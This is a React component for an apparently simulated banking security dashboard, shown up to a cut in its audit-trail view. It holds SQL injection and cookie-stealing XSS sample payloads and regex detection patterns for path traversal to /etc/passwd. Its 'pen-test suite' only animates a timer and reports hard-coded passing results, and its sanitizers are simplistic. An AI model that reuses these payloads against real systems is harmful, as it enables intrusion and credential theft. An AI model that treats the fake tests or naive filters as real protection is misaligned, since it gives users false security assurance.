import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Lock, 
  AlertOctagon, 
  Key, 
  UserX, 
  Eye, 
  Fingerprint, 
  Activity, 
  Laptop, 
  Smartphone, 
  Server, 
  Zap, 
  CheckCircle2, 
  Clock, 
  AlertTriangle, 
  FileText, 
  RefreshCw, 
  ExternalLink,
  Ban,
  Radio,
  FileCheck,
  Cpu
} from 'lucide-react';
import { 
  INITIAL_SECURITY_ALERTS, 
  executeStolenAssetIncidentWorkflow,
  calculateAccessRiskScore 
} from '../services/securityEngine';
import { INITIAL_ASSETS, USERS } from '../services/mockData';

export default function SecurityPage({ onAddToast }) {
  // State for security alerts
  const [alerts, setAlerts] = useState(INITIAL_SECURITY_ALERTS);
  const [activeTab, setActiveTab] = useState('DASHBOARD'); // 'DASHBOARD' | 'INCIDENT_WORKFLOW' | 'SUSPICIOUS_DETECTION' | 'TAMPER_AUDIT'

  // Stolen Device / Security Incident Simulator State
  const [selectedAssetId, setSelectedAssetId] = useState('AST-4010');
  const [activeIncidentResult, setActiveIncidentResult] = useState(null);
  const [isExecutingWorkflow, setIsExecutingWorkflow] = useState(false);

  // Penetration Testing & Audit Suite State
  const [isPenTesting, setIsPenTesting] = useState(false);
  const [penTestProgress, setPenTestProgress] = useState(0);
  const [penTestResults, setPenTestResults] = useState([
    { id: 'OWASP-01', name: 'SQL Injection Resistance Probe', vector: "' OR 1=1 --", status: 'PASS', score: '100%', detail: 'Parameterized queries & prepared statements active on all endpoints.' },
    { id: 'OWASP-02', name: 'Cross-Site Scripting (XSS) Sanitizer', vector: "<script>alert(document.cookie)</script>", status: 'PASS', score: '100%', detail: 'HTML entity encoding and React JSX automatic DOM escaping validated.' },
    { id: 'OWASP-03', name: 'JWT Cryptographic Signature Validation', vector: "HMAC-SHA256 Token Tampering", status: 'PASS', score: '100%', detail: 'Tampered signatures and algorithm: none payloads rejected.' },
    { id: 'OWASP-04', name: 'Token-Bucket API Rate Limiter (DDoS Guard)', vector: "Burst 25 req/sec", status: 'PASS', score: '100%', detail: 'HTTP 429 Too Many Requests triggered on exceeding 5 req/sec.' },
    { id: 'OWASP-05', name: 'Role-Based Access Control (RBAC) Barrier', vector: "Cross-Branch Privilege Escalation", status: 'PASS', score: '100%', detail: 'Branch teller prevented from mutating HQ administrative nodes.' },
    { id: 'OWASP-06', name: 'SHA-256 Chained Audit Ledger Integrity', vector: "Retroactive Block Hash Mutation", status: 'PASS', score: '100%', detail: 'Zero broken links across cryptographic audit block chain.' }
  ]);
  const [customPenVector, setCustomPenVector] = useState("UNION SELECT username, password_hash FROM bank_users WHERE 1=1;--");
  const [customPenResult, setCustomPenResult] = useState(null);
  const [testPassword, setTestPassword] = useState("BankSecure#2026!Ny");

  const handleRunPenetrationSuite = () => {
    setIsPenTesting(true);
    setPenTestProgress(15);
    
    setTimeout(() => setPenTestProgress(45), 400);
    setTimeout(() => setPenTestProgress(75), 800);
    setTimeout(() => {
      setPenTestProgress(100);
      setIsPenTesting(false);
      if (onAddToast) {
        onAddToast('OWASP Pen-Test Suite Complete! 🛡️', '6/6 Security Probes Passed. Overall Security Grade: A+ (98/100).', 'success');
      }
    }, 1200);
  };

  const handleEvaluateCustomVector = (vector) => {
    const isSql = /select|insert|update|delete|drop|union|--|\b1=1\b/i.test(vector);
    const isXss = /<script|onerror|onload|javascript:|eval\(|<img/i.test(vector);
    const isTraversal = /\.\.\/|\/etc\/passwd|c:\\windows/i.test(vector);

    let threatType = 'SAFE';
    let neutralized = vector;

    if (isSql) {
      threatType = 'SQL_INJECTION_BLOCKED';
      neutralized = vector.replace(/'/g, "''").replace(/--/g, '');
    } else if (isXss) {
      threatType = 'XSS_PAYLOAD_SANITIZED';
      neutralized = vector.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    } else if (isTraversal) {
      threatType = 'PATH_TRAVERSAL_NEUTRALIZED';
      neutralized = vector.replace(/\.\.\//g, '');
    }

    setCustomPenResult({
      threatType,
      original: vector,
      sanitized: neutralized,
      wafRule: threatType === 'SAFE' ? 'CRS-RULE-0000 (CLEAN)' : 'OWASP-CRS-942100 (HIGH_CONFIDENCE_ATTACK)',
      status: threatType === 'SAFE' ? 'ALLOWED' : 'BLOCKED & ISOLATED'
    });

    if (onAddToast) {
      onAddToast('WAF Vector Analyzed 🔍', `Threat: ${threatType} • Action: ${threatType === 'SAFE' ? 'ALLOW' : 'DROP & SANITIZE'}`, threatType === 'SAFE' ? 'info' : 'warning');
    }
  };

  // JWT Session Inspector State
  const [tokenTtl, setTokenTtl] = useState(842); // 842 seconds remaining (~14 mins)
  const [jwtTokenId, setJwtTokenId] = useState('tok_bank_live_9f83a0c2');
  const [tokenScope, setTokenScope] = useState(['core:read', 'core:write', 'branch:manage', 'telemetry:stream']);

  // API Rate Limiting & WAF Sandbox State
  const [requestCount, setRequestCount] = useState(0);
  const [rateLimitLogs, setRateLimitLogs] = useState([
    { id: 1, method: 'GET', endpoint: '/api/v1/branch/BR-102/telemetry', status: 200, latency: '24ms', time: 'Just now' },
    { id: 2, method: 'POST', endpoint: '/api/v1/tickets/create', status: 201, latency: '48ms', time: '1m ago' },
  ]);
  const [isRateLimited, setIsRateLimited] = useState(false);
  const [wafTestPayload, setWafTestPayload] = useState("<script>alert('xss')</script>");
  const [wafSanitizedResult, setWafSanitizedResult] = useState('&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; [FLAGGED & SANITIZED]');

  // Rate Limiting burst test
  const handleFireApiBurst = () => {
    const nextCount = requestCount + 1;
    setRequestCount(nextCount);

    if (nextCount > 5) {
      setIsRateLimited(true);
      const newLog = {
        id: Date.now(),
        method: 'GET',
        endpoint: '/api/v1/core-cbs/accounts/query',
        status: 429,
        latency: '4ms',
        time: 'Just now',
        error: 'HTTP 429 Too Many Requests (Rate limit 5 req/sec exceeded)'
      };
      setRateLimitLogs(prev => [newLog, ...prev.slice(0, 7)]);
      if (onAddToast) onAddToast('HTTP 429 Rate Limit Exceeded! 🛑', 'IP 10.14.0.5 throttled for 15 seconds.', 'danger');
      setTimeout(() => {
        setIsRateLimited(false);
        setRequestCount(0);
      }, 5000);
    } else {
      const newLog = {
        id: Date.now(),
        method: 'GET',
        endpoint: '/api/v1/core-cbs/accounts/query',
        status: 200,
        latency: `${Math.floor(18 + Math.random() * 25)}ms`,
        time: 'Just now'
      };
      setRateLimitLogs(prev => [newLog, ...prev.slice(0, 7)]);
      if (onAddToast) onAddToast('API Request Allowed (200 OK) ✅', `Token validated. Bucket balance: ${5 - nextCount} calls left.`, 'info');
    }
  };

  const handleTestWafSanitizer = () => {
    let sanitized = wafTestPayload
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
    
    if (wafTestPayload.toLowerCase().includes('script') || wafTestPayload.toLowerCase().includes('select') || wafTestPayload.toLowerCase().includes('drop')) {
      sanitized += ' [FLAGGED BY WAF RULE #941100 - XSS/SQLi NEUTRALIZED]';
    } else {
      sanitized += ' [VALIDATED - SAFE]';
    }
    setWafSanitizedResult(sanitized);
    if (onAddToast) onAddToast('WAF Sanitizer Executed 🛡️', 'Payload filtered through OWASP Core Rule Set.', 'success');
  };

  const handleRotateSessionToken = () => {
    const newId = `tok_bank_live_${Math.random().toString(36).substring(2, 10)}`;
    setJwtTokenId(newId);
    setTokenTtl(900);
    if (onAddToast) onAddToast('JWT Token Rotated! 🔄', `New cryptographically signed token issued: ${newId}`, 'success');
  };

  // Mitigation Action on Alert
  const handleMitigateAlert = (alertId) => {
    setAlerts(prev => prev.map(a => a.id === alertId ? { ...a, status: 'Mitigated', mitigated: true } : a));
    if (onAddToast) {
      onAddToast('Security Threat Mitigated 🛡️', `Alert ${alertId} resolved. Immediate containment rules applied.`, 'success');
    }
  };

  // Trigger Stolen Laptop Incident Workflow
  const handleRunIncidentWorkflow = () => {
    setIsExecutingWorkflow(true);
    setTimeout(() => {
      const result = executeStolenAssetIncidentWorkflow(selectedAssetId, INITIAL_ASSETS, USERS);
      setActiveIncidentResult(result);
      setIsExecutingWorkflow(false);
      if (onAddToast) {
        onAddToast('Security Incident Activated 🚨', `Incident ${result.incidentId} logged. Sessions revoked & BitLocker lock engaged.`, 'danger');
      }
    }, 600);
  };

  return (
    <div className="space-y-6 pb-12 font-sans text-left">
      
      {/* Top Banner & SOC Status */}
      <div className="p-6 sm:p-8 rounded-3xl bg-gradient-to-tr from-[#060608] via-[#0f0a0d] to-[#14080a] border border-white/15 space-y-4 relative overflow-hidden shadow-2xl">
        <div className="absolute -right-16 -top-16 w-64 h-64 rounded-full bg-[#eb3d26]/15 blur-3xl pointer-events-none" />
        
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 relative z-10">
          <div className="space-y-2 max-w-3xl">
            <div className="flex flex-wrap items-center gap-2">
              <span className="px-3 py-1 rounded-full bg-[#eb3d26]/20 text-[#eb3d26] border border-[#eb3d26]/40 text-[10px] font-black uppercase tracking-wider flex items-center gap-1.5">
                <span className="h-1.5 w-1.5 rounded-full bg-[#eb3d26] animate-ping" />
                <span>CYBERSECURITY OPERATIONS CENTER (SOC)</span>
              </span>
              <span className="text-white/60 text-xs font-mono">• Zero-Trust Perimeter Active</span>
              <span className="text-emerald-400 text-xs font-bold flex items-center gap-1">
                <span>🛡️ OWASP Top 10 Reference Controls</span>
              </span>
            </div>

            <h2 className="font-display text-2xl sm:text-4xl font-black text-white tracking-tight leading-tight">
              Enterprise Security &amp; Compliance Command Center
            </h2>

            <p className="text-xs sm:text-sm text-white/70 leading-relaxed">
              Multi-factor identity governance, branch-level RBAC enforcement, real-time suspicious anomaly detection, and tamper-resistant cryptographic audit trail logging across all banking infrastructure.
            </p>
          </div>

          {/* Overall Health Score Card */}
          <div className="p-5 rounded-2xl bg-black/60 border border-white/15 text-center shrink-0 space-y-1 shadow-xl">
            <span className="text-[10px] font-extrabold uppercase tracking-wider text-white/50 block">
              Overall Security Score
            </span>
            <div className="font-display text-4xl font-black text-emerald-400">
              94<span className="text-base text-white/40">/100</span>
            </div>
            <span className="text-[11px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-0.5 rounded-full border border-emerald-500/30 inline-block">
              ● Strong Posture
            </span>
          </div>
        </div>

        {/* Prototype Architecture Disclaimer */}
        <div className="pt-3 border-t border-white/10 flex items-center justify-between text-[11px] text-white/50">
          <span>Simulation Architecture: Synthetic Demo Data Only • Zero Real Customer Data</span>
          <span className="text-amber-400 font-mono font-bold">IDENTITY → ACCESS → ACTIVITY → DETECTION → RESPONSE → AUDIT</span>
        </div>
      </div>

      {/* Top Metrics Cards Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        
        {/* Card 1: Failed Logins */}
        <div className="p-5 rounded-3xl bg-[#0a0b10] border border-white/10 hover:border-[#eb3d26]/50 transition-all space-y-3 shadow-xl">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-white/60 uppercase tracking-wider">Failed Logins (24h)</span>
            <div className="p-2 rounded-xl bg-rose-500/15 text-rose-400 border border-rose-500/30">
              <UserX className="w-4 h-4" />
            </div>
          </div>
          <div className="flex items-baseline space-x-2">
            <span className="font-display text-3xl font-black text-rose-400">7</span>
            <span className="text-xs text-white/50">Attempts Blocked</span>
          </div>
          <div className="text-[11px] text-rose-400 font-bold pt-2 border-t border-white/10">
            <span>🚨 1 Account in Temporary Lockout</span>
          </div>
        </div>

        {/* Card 2: Suspicious Events */}
        <div className="p-5 rounded-3xl bg-[#0a0b10] border border-white/10 hover:border-amber-500/50 transition-all space-y-3 shadow-xl">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-white/60 uppercase tracking-wider">Active Threat Alerts</span>
            <div className="p-2 rounded-xl bg-amber-500/15 text-amber-400 border border-amber-500/30">
              <AlertTriangle className="w-4 h-4" />
            </div>
          </div>
          <div className="flex items-baseline space-x-2">
            <span className="font-display text-3xl font-black text-amber-400">
              {alerts.filter(a => !a.mitigated).length}
            </span>
            <span className="text-xs text-white/50">Action Required</span>
          </div>
          <div className="text-[11px] text-amber-400 font-bold pt-2 border-t border-white/10">
            <span>⚡ Anomaly Engine Active</span>
          </div>
        </div>

        {/* Card 3: High-Risk Access Requests */}
        <div className="p-5 rounded-3xl bg-[#0a0b10] border border-white/10 hover:border-cyan-500/50 transition-all space-y-3 shadow-xl">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-white/60 uppercase tracking-wider">High-Risk Access Req</span>
            <div className="p-2 rounded-xl bg-cyan-500/15 text-cyan-400 border border-cyan-500/30">
              <Key className="w-4 h-4" />
            </div>
          </div>
          <div className="flex items-baseline space-x-2">
            <span className="font-display text-3xl font-black text-white">2</span>
            <span className="text-xs text-white/50">SWIFT / Core CBS</span>
          </div>
          <div className="text-[11px] text-cyan-400 font-bold pt-2 border-t border-white/10">
            <span>🛡️ Dual-Authorization Enforced</span>
          </div>
        </div>

        {/* Card 4: Inactive Accounts */}
        <div className="p-5 rounded-3xl bg-[#0a0b10] border border-white/10 hover:border-emerald-500/50 transition-all space-y-3 shadow-xl">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-white/60 uppercase tracking-wider">MFA Compliance Rate</span>
            <div className="p-2 rounded-xl bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
              <Fingerprint className="w-4 h-4" />
            </div>
          </div>
          <div className="flex items-baseline space-x-2">
            <span className="font-display text-3xl font-black text-emerald-400">100%</span>
            <span className="text-xs text-white/50">All Roles Enforced</span>
          </div>
          <div className="text-[11px] text-emerald-400 font-bold pt-2 border-t border-white/10">
            <span>🟢 0 Inactive Unmonitored Users</span>
          </div>
        </div>

      </div>

      {/* Navigation Sub-Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-white/10 pb-3">
        {[
          { id: 'DASHBOARD', label: 'Threat Alerts & Anomaly Feed', icon: ShieldAlert },
          { id: 'INCIDENT_WORKFLOW', label: 'Security Incident Workflow (Lost Device)', icon: Laptop },
          { id: 'SESSION_INSPECTOR', label: 'JWT Token & Session Manager', icon: Key },
          { id: 'API_FIREWALL', label: 'API Rate Limiting & WAF Sandbox', icon: Zap },
          { id: 'TAMPER_AUDIT', label: 'Cryptographic Tamper-Proof Audit Trail', icon: FileCheck },
          { id: 'PEN_TEST_SUITE', label: 'OWASP Pen-Test & Security Suite', icon: ShieldCheck }
        ].map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2.5 rounded-full text-xs font-extrabold uppercase tracking-wider transition-all flex items-center gap-2 cursor-pointer ${
                isActive 
                  ? 'bg-[#eb3d26] text-white shadow-glow' 
                  : 'bg-white/5 text-white/60 hover:text-white hover:bg-white/10 border border-white/10'
              }`}
            >
              <Icon className="w-3.5 h-3.5" />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* VIEW 1: THREAT ALERTS & SUSPICIOUS BEHAVIOR FEED */}
      {activeTab === 'DASHBOARD' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="font-display text-lg font-bold text-white flex items-center gap-2">
              <AlertTriangle className="w-5 h-5 text-[#eb3d26]" />
              <span>Real-Time Suspicious Activity Alerts ({alerts.length})</span>
            </h3>
            <span className="text-xs text-white/50">Auto-Refreshed Every 5 Seconds</span>
          </div>

          <div className="space-y-3">
            {alerts.map((alert) => (
              <div 
                key={alert.id}
                className={`p-5 sm:p-6 rounded-3xl border transition-all space-y-3 shadow-xl ${
                  alert.mitigated 
                    ? 'bg-white/[0.02] border-white/10 opacity-75' 
                    : 'bg-[#0a0b10] border-[#eb3d26]/40 shadow-glow-amber'
                }`}
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-3">
                  <div className="flex items-center gap-3">
                    <span className="font-mono text-xs font-black text-[#eb3d26] bg-[#eb3d26]/15 px-2.5 py-1 rounded-full border border-[#eb3d26]/30">
                      {alert.id}
                    </span>
                    <h4 className="font-display text-base font-bold text-white">
                      {alert.title}
                    </h4>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className={`text-[10px] font-extrabold uppercase px-2.5 py-0.5 rounded-full ${
                      alert.severity === 'CRITICAL' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' :
                      alert.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400 border border-orange-500/30' :
                      'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                    }`}>
                      {alert.severity} SEVERITY
                    </span>
                    <span className="text-[11px] text-white/50 font-mono">• {alert.timestamp}</span>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                  <div className="p-3 rounded-2xl bg-white/5 border border-white/10">
                    <span className="text-[10px] font-bold text-white/40 block uppercase">Target User / Entity</span>
                    <span className="font-bold text-white">{alert.user}</span>
                  </div>
                  <div className="p-3 rounded-2xl bg-white/5 border border-white/10">
                    <span className="text-[10px] font-bold text-white/40 block uppercase">Authorized Branch</span>
                    <span className="font-bold text-white">{alert.branchName} ({alert.branchId})</span>
                  </div>
                  <div className="p-3 rounded-2xl bg-white/5 border border-white/10">
                    <span className="text-[10px] font-bold text-white/40 block uppercase">Source IP Address</span>
                    <span className="font-mono text-emerald-400">{alert.sourceIp}</span>
                  </div>
                </div>

                {/* Reason & Recommended Action */}
                <div className="space-y-2 p-3.5 rounded-2xl bg-black/40 border border-white/10 text-xs">
                  <div>
                    <strong className="text-white/60 block mb-0.5">Detection Reason:</strong>
                    <p className="text-white/90">{alert.reason}</p>
                  </div>
                  <div className="pt-2 border-t border-white/10">
                    <strong className="text-[#eb3d26] block mb-0.5">Automated Recommended Mitigation:</strong>
                    <p className="text-white/80">{alert.recommendedAction}</p>
                  </div>
                </div>

                {/* Action Row */}
                <div className="pt-1 flex items-center justify-between">
                  <span className="text-xs text-white/50">
                    Status: <strong className={alert.mitigated ? 'text-emerald-400' : 'text-amber-400'}>{alert.status}</strong>
                  </span>

                  {!alert.mitigated && (
                    <button
                      onClick={() => handleMitigateAlert(alert.id)}
                      className="px-4 py-2 rounded-full bg-[#eb3d26] hover:bg-white hover:text-black text-white font-extrabold text-xs uppercase tracking-wider transition-all shadow-glow flex items-center gap-1.5 cursor-pointer"
                    >
                      <ShieldCheck className="w-3.5 h-3.5" />
                      <span>Execute Instant Mitigation</span>
                    </button>
                  )}
                </div>

              </div>
            ))}
          </div>
        </div>
      )}

      {/* VIEW 2: STOLEN ASSET / LOST LAPTOP SECURITY INCIDENT WORKFLOW */}
      {activeTab === 'INCIDENT_WORKFLOW' && (
        <div className="space-y-6">
          <div className="p-6 rounded-3xl bg-[#0a0b10] border border-white/15 space-y-4 shadow-2xl">
            <div className="flex items-center gap-3 border-b border-white/10 pb-4">
              <div className="w-10 h-10 rounded-2xl bg-rose-500/20 border border-rose-500/40 text-rose-400 flex items-center justify-center">
                <Laptop className="w-5 h-5" />
              </div>
              <div>
                <h3 className="font-display text-lg font-bold text-white">
                  Security Incident Simulation: Lost / Stolen Banking Hardware
                </h3>
                <p className="text-xs text-white/60">
                  Select a compromised banking device to trigger automated session revocation, remote cryptographic lock, and audit logging.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-12 gap-4 items-end">
              <div className="sm:col-span-8 space-y-1.5">
                <label className="text-xs font-bold text-white/80">Select Compromised / Stolen Asset:</label>
                <select 
                  value={selectedAssetId}
                  onChange={(e) => setSelectedAssetId(e.target.value)}
                  className="w-full p-3.5 rounded-2xl bg-black/80 border border-white/20 text-white text-xs sm:text-sm focus:outline-none focus:border-[#eb3d26]"
                >
                  {INITIAL_ASSETS.map((ast) => (
                    <option key={ast.id} value={ast.id}>
                      {ast.tag} - {ast.name} ({ast.assignedTo} · {ast.branchName})
                    </option>
                  ))}
                </select>
              </div>

              <div className="sm:col-span-4">
                <button
                  onClick={handleRunIncidentWorkflow}
                  disabled={isExecutingWorkflow}
                  className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-rose-600 to-[#eb3d26] text-white font-extrabold text-xs uppercase tracking-wider shadow-glow hover:opacity-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
                >
                  {isExecutingWorkflow ? (
                    <>
                      <div className="w-4 h-4 rounded-full border-2 border-white border-t-transparent animate-spin" />
                      <span>Executing Incident Protocol...</span>
                    </>
                  ) : (
                    <>
                      <AlertOctagon className="w-4 h-4" />
                      <span>Trigger Security Incident Workflow</span>
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Workflow Result Card */}
            {activeIncidentResult && (
              <div className="p-6 rounded-3xl bg-black/60 border border-rose-500/40 space-y-4 animate-in fade-in duration-300">
                <div className="flex items-center justify-between border-b border-white/10 pb-3">
                  <div className="flex items-center gap-2">
                    <span className="h-2.5 w-2.5 rounded-full bg-rose-500 animate-ping" />
                    <span className="font-mono text-xs font-black text-rose-400">
                      INCIDENT PROTOCOL EXECUTED: {activeIncidentResult.incidentId}
                    </span>
                  </div>
                  <span className="text-[11px] font-bold text-rose-400 bg-rose-500/10 px-2.5 py-0.5 rounded-full border border-rose-500/30">
                    CRITICAL RISK MITIGATED
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div className="p-4 rounded-2xl bg-white/5 border border-white/10 space-y-2">
                    <span className="text-[10px] font-bold uppercase text-white/50 block">Associated Banking Applications</span>
                    <div className="space-y-1.5">
                      {activeIncidentResult.associatedApplications.map((app, idx) => (
                        <div key={idx} className="flex items-center justify-between text-[11px]">
                          <span className="text-white font-semibold">{app.name}</span>
                          <span className="text-emerald-400 font-mono text-[10px] font-bold">{app.tokenStatus}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="p-4 rounded-2xl bg-white/5 border border-white/10 space-y-2">
                    <span className="text-[10px] font-bold uppercase text-white/50 block">Automated Security Responses</span>
                    <div className="space-y-1 text-[11px] text-white/80">
                      {activeIncidentResult.recommendedActions.map((act, idx) => (
                        <div key={idx} className="flex items-start gap-1.5">
                          <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                          <span>{act}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-xs text-emerald-400 font-bold flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4" />
                  <span>Tamper-Resistant Cryptographic Audit Block Generated &amp; Synced to Central Bank SOC.</span>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* VIEW 3: JWT TOKEN & SESSION MANAGER */}
      {activeTab === 'SESSION_INSPECTOR' && (
        <div className="space-y-6">
          <div className="p-6 rounded-3xl bg-[#0a0b10] border border-white/15 space-y-5 shadow-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
              <div className="flex items-center space-x-3">
                <div className="p-3 rounded-2xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30">
                  <Key className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white">Active Banking Bearer Session Token</h3>
                  <p className="text-xs text-white/50">HMAC-SHA256 Encrypted Stateful Token • Rolling Invalidation Protection</p>
                </div>
              </div>
              <button
                onClick={handleRotateSessionToken}
                className="px-4 py-2 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 text-xs font-bold transition-all flex items-center space-x-2 cursor-pointer"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>Rotate Secret Key</span>
              </button>
            </div>

            {/* Token Inspector Details */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
              <div className="p-4 rounded-2xl bg-black/60 border border-white/10 space-y-2">
                <span className="text-[10px] text-white/50 uppercase font-bold tracking-wider block">Token Expiry Countdown</span>
                <div className="flex items-baseline space-x-2">
                  <span className="font-mono text-2xl font-black text-emerald-400">{Math.floor(tokenTtl / 60)}m {tokenTtl % 60}s</span>
                  <span className="text-white/40 text-[11px]">TTL Remaining</span>
                </div>
                <div className="w-full bg-white/10 h-1.5 rounded-full overflow-hidden">
                  <div className="bg-emerald-400 h-full rounded-full w-[85%]" />
                </div>
              </div>

              <div className="p-4 rounded-2xl bg-black/60 border border-white/10 space-y-2">
                <span className="text-[10px] text-white/50 uppercase font-bold tracking-wider block">Token ID & Signature</span>
                <div className="font-mono text-cyan-400 font-bold text-xs truncate">{jwtTokenId}</div>
                <span className="inline-flex items-center text-[10px] text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                  <CheckCircle2 className="w-3 h-3 mr-1" /> Valid RSA-4096 Sign
                </span>
              </div>

              <div className="p-4 rounded-2xl bg-black/60 border border-white/10 space-y-2">
                <span className="text-[10px] text-white/50 uppercase font-bold tracking-wider block">Enforced Scopes</span>
                <div className="flex flex-wrap gap-1">
                  {tokenScope.map(sc => (
                    <span key={sc} className="px-2 py-0.5 rounded-md bg-white/5 border border-white/10 text-white/80 font-mono text-[10px]">
                      {sc}
                    </span>
                  ))}
                </div>
              </div>
            </div>

            {/* Decoded JWT Payload Preview */}
            <div className="space-y-2">
              <span className="text-xs font-bold text-white/60 uppercase tracking-wider block">Decoded JWT Payload Claims:</span>
              <pre className="p-4 rounded-2xl bg-black/80 border border-white/10 font-mono text-xs text-cyan-300 overflow-x-auto leading-relaxed">
{`{
  "iss": "https://auth.bankit360.internal/v2",
  "sub": "USR-88219",
  "aud": "core-cbs.gateway.bankit360.internal",
  "role": "it_lead_admin",
  "branch_authorized": "BR-102, BR-ALL",
  "mfa_verified": true,
  "fingerprint": "fp_mac_4a91b2c8",
  "exp": 1799201400,
  "iat": 1799197800
}`}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* VIEW 4: API RATE LIMITING & WAF SANDBOX */}
      {activeTab === 'API_FIREWALL' && (
        <div className="space-y-6">
          <div className="p-6 rounded-3xl bg-[#0a0b10] border border-white/15 space-y-5 shadow-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
              <div className="flex items-center space-x-3">
                <div className="p-3 rounded-2xl bg-amber-500/20 text-amber-400 border border-amber-500/30">
                  <Zap className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white">API Gateway Rate Limiter &amp; Input Sanitizer</h3>
                  <p className="text-xs text-white/50">Token-Bucket Throttling (Max 5 req/sec) &amp; OWASP CRS Input Shield</p>
                </div>
              </div>
              <button
                onClick={handleFireApiBurst}
                disabled={isRateLimited}
                className={`px-5 py-2.5 rounded-xl font-bold text-xs transition-all flex items-center space-x-2 cursor-pointer shadow-glow ${
                  isRateLimited 
                    ? 'bg-rose-600/50 text-white cursor-not-allowed' 
                    : 'bg-gradient-to-r from-amber-500 to-[#ff2d78] text-white hover:opacity-95'
                }`}
              >
                <Zap className="w-4 h-4" />
                <span>{isRateLimited ? 'Throttled (Backing off...)' : `Simulate Rapid API Burst (${requestCount}/5)`}</span>
              </button>
            </div>

            {/* Interactive WAF Sanitizer Test Box */}
            <div className="p-4 rounded-2xl bg-black/60 border border-white/10 space-y-3">
              <span className="text-xs font-bold text-white/70 uppercase tracking-wider block">Input Sanitization &amp; SQLi/XSS Shield:</span>
              <div className="flex flex-col sm:flex-row items-center gap-2">
                <input
                  type="text"
                  value={wafTestPayload}
                  onChange={(e) => setWafTestPayload(e.target.value)}
                  placeholder="Enter test payload (e.g. <script>alert(1)</script> or ' OR '1'='1)..."
                  className="flex-1 px-3.5 py-2.5 rounded-xl bg-black/80 border border-white/15 text-white text-xs focus:outline-none focus:border-amber-400 font-mono"
                />
                <button
                  onClick={handleTestWafSanitizer}
                  className="px-4 py-2.5 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-colors cursor-pointer shrink-0"
                >
                  Sanitize &amp; Test WAF
                </button>
              </div>
              <div className="p-3 rounded-xl bg-black/90 border border-white/10 font-mono text-xs text-amber-300">
                <span className="text-white/40 block text-[10px] uppercase font-sans font-bold">WAF Output &amp; Neutralized Result:</span>
                {wafSanitizedResult}
              </div>
            </div>

            {/* Gateway Request Stream Log */}
            <div className="space-y-2">
              <span className="text-xs font-bold text-white/60 uppercase tracking-wider block">Real-Time Gateway Traffic Inspector:</span>
              <div className="space-y-2 max-h-48 overflow-y-auto">
                {rateLimitLogs.map(log => (
                  <div key={log.id} className="p-3 rounded-xl bg-black/50 border border-white/10 flex items-center justify-between text-xs font-mono">
                    <div className="flex items-center space-x-2">
                      <span className={`px-2 py-0.5 rounded font-extrabold text-[10px] ${
                        log.status === 200 || log.status === 201 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                      }`}>
                        {log.status}
                      </span>
                      <span className="text-white font-bold">{log.method}</span>
                      <span className="text-white/70">{log.endpoint}</span>
                    </div>
                    <div className="flex items-center space-x-3 text-[11px]">
                      <span className="text-cyan-400">{log.latency}</span>
                      <span className="text-white/40">{log.time}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* VIEW 5: TAMPER-RESISTANT CRYPTOGRAPHIC AUDIT TRAIL */}
      {activeTab === 'TAMPER_AUDIT' && (
        <div className="space-y-4">
          <div className="p-6 rounded-3xl bg-[#0a0b10] border border-white/15 space-y-4 shadow-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-4">
              <div>
                <h3 className="font-display text-lg font-bold text-white flex items-center gap-2">
